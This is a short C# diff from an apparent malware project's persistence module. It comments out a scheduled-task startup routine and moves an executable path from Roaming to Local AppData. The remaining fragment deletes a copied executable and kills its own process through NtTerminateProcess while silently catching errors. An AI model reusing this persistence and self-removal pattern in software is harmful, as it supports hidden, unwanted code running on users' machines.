@@ -5,9 +5,10 @@ using System.IO;
 
 namespace Offline.Persistence
 {
+    //TODO
     public class TaskScheduler
     {
-        public static void StartUpTaskScheduler(string Time, string TaskName)
+        /*public static void StartUpTaskScheduler(string Time, string TaskName)
         {
             try
             {
@@ -31,7 +32,7 @@ namespace Offline.Persistence
         {
             try
             {
-                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Launch.ExecName;
+                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Launch.ExecName;
                 try
                 { File.Delete(newPath); }
                 catch { }
@@ -41,6 +42,6 @@ namespace Offline.Persistence
                 Imports.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
             }
             catch { } //(Exception ex) { MessageBox.Show(ex.ToString()); }
-        }
+        }*/
     }
 }
